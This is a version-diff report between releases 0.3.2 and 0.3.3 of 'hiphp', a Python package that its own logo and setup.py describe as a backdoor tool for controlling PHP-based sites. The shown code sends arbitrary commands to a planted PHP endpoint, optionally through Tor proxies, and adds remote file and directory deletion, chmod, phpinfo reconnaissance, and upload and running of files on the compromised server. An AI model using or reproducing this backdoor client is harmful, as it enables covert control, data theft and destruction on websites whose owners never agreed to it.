                 else:
-                    hiphp.upload(self,command.split(" ")[1])
+                    try:
+                        command = rm(dirx[1], dirx[2])
+                        hiphp.do(self, self.key, self.url, self.headers, False, command)
+                    except:
+                        help(__version__, "--rm")
+
+            # php_info
+            elif command.lower().startswith("--phpinfo") or command.lower().startswith("phpinfo"):
+                command = php_info()
+                hiphp.do(self, self.key, self.url, self.headers, False, command)
+
+            # rf
+            elif command.lower().startswith("--rf") or command.lower().startswith("rf") or command.lower().startswith("run"):
+                varss = command.split(" ")
+                if varss[-1] == "":
+                    del varss[-1]
+                print(hiphp.run_file(self, varss[1], varss[2:]))
+
+            # up
+            elif command.lower().startswith("--up") or command.lower().startswith("up") or command.lower().startswith("upload"):
+                v = command.split(" ")
+                if len(v) > 2:
+                    file_path = v[1]
+                    to = v[2]
+                    if to[-1:] != self.DS:
+                        to += self.DS
+                    hiphp.upload(self, file_path, to)
+                else:
+                    hiphp.upload(self, v[1])
             else:
-                comand_return=hiphp.do(self,self.key,self.url,self.headers,True,command)
-                if comand_return!="":
-                    print(comand_return)
+                comand_return = hiphp.do(self, self.key, self.url, self.headers, True, command)
+                if comand_return != "":
+                    if re.search(re.escape(emsg_3), comand_return):
+                        self.color2.c(emsg_2,self.c_red)
+                    else:
+                        print(comand_return)
                 else:
-                    self.color2.c(errx+" "+command+emsg_6,self.c_red)
+                    self.color2.c(errx + " " + command + emsg_6, self.c_red)
+
         else:
             self.color2.c(emsg_2,self.c_red)
         
         #if scanner.lower()=="y":
         hiphp.cli(self)
         #else:
             #exit()
 
     #do:
-    def do(self,key,url,header,retu,command):
+    def do(self, key, url, header, retu, command):
         regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
-        proxies_onion = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}
+        proxies_onion = {'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
+        
         try:
             if regex.match(url):
-                #.onion
-                response=requests.post(url,headers=header,proxies=proxies_onion)
+                # .onion
+                proxies = proxies_onion
             else:
-                if self.proxies!="":
-                    response=requests.post(url,headers=header,proxies=self.proxies)
-                else:
-                    response=requests.post(url,headers=header)
-            #response=requests.post(url,headers=header)
-            #
-            if response.status_code==200:
-                key_len=len(key)+1
-                # if the key are true:
-                if response.text[0:key_len]=="#"+key:
-                    ploads={'command':self.cd+self.set+command}
-                    if ".onion" in url:
-                        response=requests.post(url,headers=header,data=ploads,proxies=proxies_onion)
-                    else:
-                        if self.proxies!="":
-                            response=requests.post(url,headers=header,data=ploads,proxies=self.proxies)
-                        else:
-                            response=requests.post(url,headers=header,data=ploads)
-                    response_text=response.text[key_len:]
-                    if retu==True:
+                proxies = self.proxies if self.proxies != "" else None
+                
+            response = requests.post(url, headers=header, proxies=proxies, data=self._build_payload(command))
+            
+            if response.status_code == 200:
+                response_text = response.text
+                if response_text.startswith("#" + key):
+                    response_text = response_text[len(key) + 1:]
+                    if retu:
                         return response_text
                     else:
-                        if len(response_text)!=0:
+                        if response_text:
                             print(response_text)
                 else:
-                    if retu==True:
+                    if retu:
                         return emsg_1
                     else:
-                        hexor().c(emsg_1,self.c_red)
+                        hexor().c(emsg_1, self.c_red)
                         exit()
-        except:
-            emsg=emsg_3+" '"+url+"'."
-            if retu==True:
+            else:
+                raise Exception("Request failed with status code: " + str(response.status_code))
+        except Exception as e:
+            emsg = emsg_3 + " '" + url + "'."
+            if retu:
                 return emsg
             else:
-                hexor().c(emsg,self.c_red)
+                hexor().c(emsg, self.c_red)
                 exit()
 
+    def _build_payload(self, command):
+        ploads = {'command': self.cd + self.set + command}
+        return ploads
+
     #run_file:
     def run_file(self,file_path,*opts):        
         if exists(file_path):
             open_file=open(file_path).read()
             #
             if open_file[0:5]=="<?php":
                 open_file=open_file[6:]
@@ -537,15 +618,14 @@
             return download_folder
         download_folder = get_download_folder()
         if download_folder:
             outpath=download_folder
         else:
             outpath=os.path.abspath(os.getcwd())
 
-
         new_command=file_to_b64(path_x)
         path_x=os.path.basename(path_x)
         #if outpath=="":
         #    outpath=os.path.abspath(os.getcwd())
         
         if outpath[-1]!=self.sep:
             outpath+=self.sep
```

### Comparing `hiphp-0.3.2/hiphp/hiphpabout.py` & `hiphp-0.3.3/hiphp/hiphpabout.py`

 * *Files identical despite different names*

### Comparing `hiphp-0.3.2/hiphp/hiphpcoding.py` & `hiphp-0.3.3/hiphp/hiphpcoding.py`

 * *Files identical despite different names*

### Comparing `hiphp-0.3.2/hiphp/hiphpeditor.py` & `hiphp-0.3.3/hiphp/hiphpeditor.py`

 * *Files 2% similar despite different names*

```diff
@@ -65,12 +65,14 @@
     if c > rwlen: c = rwlen 
     if ch == (ord('q') & 0x1f): xxvo=False
     elif ch == (ord('s') & 0x1f):
       cont = ''
       for l in b: cont += ''.join([chr(c) for c in l]) + '\n'
       with open(src, 'w') as f:
         f.write(cont)
+        #print(f"The '{src}', was edited successfully.")
         xxvo=False
+        
   curses.endwin()
 #editor("vvvv.py")
 #curses.wrapper(main)
 #}END.
```

### Comparing `hiphp-0.3.2/hiphp/hiphphelp.py` & `hiphp-0.3.3/hiphp/hiphphelp.py`

 * *Files 2% similar despite different names*

```diff
@@ -123,24 +123,30 @@
 
 #
   mv_c="""
   --mv, mv                           # Move files and folders.
   Usage: --mv [SOURCE] [DESTINATION]
 """
 
+#
+  chmod_c="""
+  --chmod, chmod                     # change file/folder permissions
+  Usage: --chmod [PERMISSIONS] [FILE/DIR_PATH]
+"""
+
   #
   ABOUT="""
 About:
 
   --update, update                   # Check for updates.
   --license, license                 # View the project license.
   --about, about                     # About this project.
   --version, version                 # Get the current version number."""
 
   if opt=="":
-    return header+OPTIONS+ACTIONS+ls_c+spsbar+cat_c+spsbar+set_c+spsbar+cd_c+spsbar+rf_c+spsbar+up_c+spsbar+down_c+spsbar+zip_c+spsbar+edt_c+spsbar+rm_c+spsbar+mv_c+spsbar+ABOUT
+    return header+OPTIONS+ACTIONS+ls_c+spsbar+cat_c+spsbar+set_c+spsbar+cd_c+spsbar+rf_c+spsbar+up_c+spsbar+down_c+spsbar+zip_c+spsbar+edt_c+spsbar+rm_c+spsbar+mv_c+spsbar+chmod_c+spsbar+ABOUT
   else:
     opt=opt.replace("--","")
     opt=opt+"_c"
     x=""
     exec(f"print({opt})")
 #}END.
```

### Comparing `hiphp-0.3.2/hiphp/hiphplicense.py` & `hiphp-0.3.3/hiphp/hiphplicense.py`

 * *Files identical despite different names*

### Comparing `hiphp-0.3.2/hiphp/hiphplinkextractor.py` & `hiphp-0.3.3/hiphp/hiphplinkextractor.py`

 * *Files identical despite different names*

### Comparing `hiphp-0.3.2/hiphp/hiphplogo.py` & `hiphp-0.3.3/hiphp/hiphplogo.py`

 * *Files 8% similar despite different names*

```diff
@@ -11,53 +11,54 @@
 #   |    All posts with #yasserbdj96                          |   #
 #   |    All views are my own.                                |   #
 # --+---------------------------------------------------------+-- #
 #   |                                                         |   #
 
 #START{
 from hexor import *
-from biglibrary import *
+#from biglibrary import *
+from hiphp.hiphpfunc import *
 
 # logo:
 def logo(__version__):
     logo=""
     c_red="#ea4335"#red
     c_blue="#4285f4"#blue
     c_yellow="#fbbc05"#yellow
     c_green="#34a853"#green
     c_white="#f7f7f7"
 
     color=hexor(True,"hex")
-    bl=biglibrary(returning=True)
+    #bl=biglibrary(returning=True)
     logox="\n"
-    logox+=color.c(bl.center("             ▄███████▄    ▄█    █▄       ▄███████▄"),c_red)
+    logox+=color.c(center("             ▄███████▄    ▄█    █▄       ▄███████▄"),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("            ███    ███   ███    ███     ███    ███"),c_red)
+    logox+=color.c(center("            ███    ███   ███    ███     ███    ███"),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("╦   ╦       ███    ███   ███    ███     ███    ███"),c_red)
+    logox+=color.c(center("╦   ╦       ███    ███   ███    ███     ███    ███"),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("║   ║ ═╦═ ▀█████████▀  ▀▀███▀▀▀▀███▀  ▀█████████▀ "),c_red)
+    logox+=color.c(center("║   ║ ═╦═ ▀█████████▀  ▀▀███▀▀▀▀███▀  ▀█████████▀ "),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("╠═══╣  ║    ███          ███    ███     ███       "),c_red)
+    logox+=color.c(center("╠═══╣  ║    ███          ███    ███     ███       "),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("║   ║  ║    ███          ███    ███     ███       "),c_red)
+    logox+=color.c(center("║   ║  ║    ███          ███    ███     ███       "),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀     "),c_red)
+    logox+=color.c(center("╩   ╩ ═╩═  ▄████▀        ███    █▀     ▄████▀     "),c_red)
     logox+="\n"
-    logox+=color.c(bl.center("+-----------------------------------------------------------------------------------+"),c_red)
+    logox+=color.c(center("+-----------------------------------------------------------------------------------+"),c_red)
     logox+="\n"
-    logox+=color.c(bl.center(f"HIPHP - Free & Open Source Project"),c_yellow)
+    logox+=color.c(center(f"HIPHP - Free & Open Source Project"),c_yellow)
     logox+="\n"
-    logox+=color.c(bl.center(f"A Backdoor Tool for Controlling PHP-based Sites"),c_yellow)
+    logox+=color.c(center(f"A Backdoor Tool for Controlling PHP-based Sites"),c_yellow)
     logox+="\n"
-    logox+=color.c(bl.center(f"Version: {__version__} by yasserbdj96"),c_green)
+    logox+=color.c(center(f"Version: {__version__} by yasserbdj96"),c_green)
     logox+="\n"
-    logox+=color.c(bl.center(f"Visit: https://yasserbdj96.github.io/hiphp/"),c_blue)
+    logox+=color.c(center(f"Visit: https://yasserbdj96.github.io/hiphp/"),c_blue)
     logox+="\n"
-    logox+=color.c(bl.center("+-----------------------------------------------------------------------------------+"),c_red)
+    logox+=color.c(center("+-----------------------------------------------------------------------------------+"),c_red)
     logox+="\n"
     logox+=color.c("\n [!] '--help' for more informations.\n",c_yellow)
     logox+=color.c(" [!] '--exit' OR 'Ctrl+C' for exit.\n",c_yellow)
     #logox+="\n"
 
     return logox
 #
```

### Comparing `hiphp-0.3.2/hiphp/hiphpmsgs.py` & `hiphp-0.3.3/hiphp/hiphpmsgs.py`

 * *Files identical despite different names*

### Comparing `hiphp-0.3.2/hiphp/hiphpphpfunctions.py` & `hiphp-0.3.3/hiphp/hiphpphpfunctions.py`

 * *Files 2% similar despite different names*

```diff
@@ -176,14 +176,16 @@
     }} else {{
         echo "[✗] Unsupported source type.";
     }}
     """
 
     return php_code
 
+
+
 #
 def zip_path(path="./"):
     php_zip_code="""// Get real path for our folder
 $rootPath = realpath('"""+path+"""');
 
 $path_name=str_replace(DIRECTORY_SEPARATOR, '_', '"""+path+"""');
 
@@ -230,23 +232,25 @@
 
 #
 def DIRECTORY_SEPARATOR():
     code="echo DIRECTORY_SEPARATOR;"
     return code
 
 #
-def rm(t,path):
-    code1="""
-$filename = '"""+path+"""';
+def rm(t, path):
+    if t == "-f":
+        code = """
+$filename = '""" + path + """';
 if (unlink($filename)){
-	echo 'The file "'.$filename.'" was deleted successfully!';
+    echo 'The file "'.$filename.'" was deleted successfully!';
 } else {
-	echo 'There was a error deleting the file "'.$filename.'"';
+    echo 'There was an error deleting the file "'.$filename.'"';
 }"""
-    code2="""
+    elif t == "-d":
+        code = """
 function deleteDirectory($dir) {
     if (!file_exists($dir)) {
         return true;
     }
     if (!is_dir($dir)) {
         return unlink($dir);
     }
@@ -257,24 +261,33 @@
         if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
             return false;
         }
     }
     if (rmdir($dir)){
         echo 'The Directory "'.$dir.'" was deleted successfully!';
     }else{
-        echo 'There was a error deleting the Directory "'.$dir.'"';
+        echo 'There was an error deleting the Directory "'.$dir.'"';
     }
 }
-deleteDirectory('"""+path+"""');
+deleteDirectory('""" + path + """');
 """
-    if t=="-f":
-        return code1
-    elif t=="-d":
-        return code2
+    else:
+        raise ValueError("Invalid type option for rm function")
+
+    return code
 
+#
+def chmod(permissions,path):
+    code="""
+    if (chmod('"""+path+"""', """+permissions+""")) {
+    echo "Permissions changed successfully for the file.";
+    } else {
+    echo "Failed to change permissions for the file.";
+    }"""
+    return code
 
 #
 def php_info():
     code="""header('Content-type: text/plain');
     echo "OS : ".php_uname();
     echo "\n";
     echo "your_ip: ".$_SERVER['REMOTE_ADDR'];
```

### Comparing `hiphp-0.3.2/hiphp/hiphpversion.py` & `hiphp-0.3.3/hiphp/hiphpversion.py`

 * *Files 1% similar despite different names*

```diff
@@ -10,9 +10,9 @@
 #   |                                                         |   #
 #   |    All posts with #yasserbdj96                          |   #
 #   |    All views are my own.                                |   #
 # --+---------------------------------------------------------+-- #
 #   |                                                         |   #
 
 #START{
-__version__="0.3.2"
+__version__="0.3.3"
 #}END.
```

### Comparing `hiphp-0.3.2/hiphp.egg-info/PKG-INFO` & `hiphp-0.3.3/hiphp.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 Metadata-Version: 2.1
 Name: hiphp
-Version: 0.3.2
+Version: 0.3.3
 Summary: hiphp - free & open source project for create a BackDoor to control PHP-based sites.
-Home-page: UNKNOWN
+Home-page: https://github.com/yasserbdj96/hiphp
 Author: yasserbdj96
 Author-email: yasser.bdj96@gmail.com
 License: MIT License
 Project-URL: Source, https://github.com/yasserbdj96/hiphp
 Project-URL: WebSite, https://yasserbdj96.github.io/hiphp
 Project-URL: Documentation, https://yasserbdj96.github.io/hiphp
 Project-URL: Chat, https://gitter.im/yasserbdj96/hiphp
@@ -60,14 +60,15 @@
 [![Deploy static content to Pages](https://github.com/yasserbdj96/hiphp/actions/workflows/pages.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pages.yml)
 [![CodeQL](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml)
 [![CodeFactor](https://www.codefactor.io/repository/github/yasserbdj96/hiphp/badge)](https://www.codefactor.io/repository/github/yasserbdj96/hiphp)
 [![Size](https://img.shields.io/github/repo-size/yasserbdj96/hiphp)](https://img.shields.io/github/repo-size/yasserbdj96/hiphp)
 [![languages](https://img.shields.io/github/languages/count/yasserbdj96/hiphp)](https://img.shields.io/github/languages/count/yasserbdj96/hiphp)
 [![Supported Versions](https://img.shields.io/pypi/pyversions/hiphp.svg)](https://pypi.org/project/hiphp) 
 [![Visitors](https://visitor-badge.laobi.icu/badge?page_id=yasserbdj96.hiphp&format=true)](https://github.com/yasserbdj96/hiphp)
+[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false)](https://hits.seeyoufarm.com)
 [![Docker pulls](https://img.shields.io/docker/pulls/yasserbdj96/hiphp)](https://hub.docker.com/r/yasserbdj96/hiphp/)
 [![Downloads](https://img.shields.io/pypi/dm/hiphp)](https://img.shields.io/pypi/dm/hiphp)
 [![Stars](https://img.shields.io/github/stars/yasserbdj96/hiphp?color=red)](https://github.com/yasserbdj96/hiphp)
 [![Forks](https://img.shields.io/github/forks/yasserbdj96/hiphp?color=red)](https://github.com/yasserbdj96/hiphp)
 [![Watching](https://img.shields.io/github/watchers/yasserbdj96/hiphp?label=Watchers&color=red&style=flat-square)](https://github.com/yasserbdj96/hiphp)
 ![GitHub contributors](https://img.shields.io/github/contributors/yasserbdj96/hiphp)
 ![GitHub closed issues](https://img.shields.io/github/issues-closed/yasserbdj96/hiphp)
@@ -171,16 +172,16 @@
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 # OR
 # Download hiphp from gitlab:
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 # Go to downloaded folder:
 ❯ cd hiphp
 # install
-❯ pip install -r requirements.txt
-❯ sudo python setup.py install
+#❯ pip install -r requirements.txt
+❯ pip install .
 
 # Uninstall:
 ❯ pip uninstall hiphp
 ```
 
 <p>click to see <a href="https://asciinema.org/a/a8DVPENs0gGfrPhBmUGRWPYZG">Demo</a></p><br>
```

### Comparing `hiphp-0.3.2/setup.py` & `hiphp-0.3.3/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -23,23 +23,25 @@
     author="yasserbdj96",
     author_email="yasser.bdj96@gmail.com",
     description='''hiphp - free & open source project for create a BackDoor to control PHP-based sites.''',
     long_description_content_type="text/markdown",
     long_description=open('README_PYPI.md','r', encoding="utf8").read(),
     license='''MIT License''',
     packages=find_packages(),
+    url='https://github.com/yasserbdj96/hiphp',
     project_urls={
         'Source': "https://github.com/yasserbdj96/hiphp",
         'WebSite': "https://yasserbdj96.github.io/hiphp",
         'Documentation': "https://yasserbdj96.github.io/hiphp",
         'Chat': "https://gitter.im/yasserbdj96/hiphp",
         'Author WebSite':"https://yasserbdj96.github.io/",
         'Sponsor': "https://github.com/sponsors/yasserbdj96"
     },
-    install_requires=["requests","hexor","biglibrary","BeautifulSoup4","asciitext"],
+    #required_by=['example_package'],
+    install_requires=["requests","hexor","BeautifulSoup4"],
     keywords = ["HIPHP BackDoor", "Open-source tool", "Remote control", "PHP programming", "HTTP/HTTPS protocol", "POST/GET method", "Port 80", "File download", "File editing", "Tor networks", "Password protection", "Webmasters", "Third-party software", "User-friendly", "Access rights", "Directory structure", "Flexibility", "Security", "Compatibility", "Content management"],
     classifiers=[
         "Environment :: Web Environment",
         "Development Status :: 5 - Production/Stable",
         "Intended Audience :: Developers",
         "Natural Language :: English",
         "License :: OSI Approved :: MIT License",
```

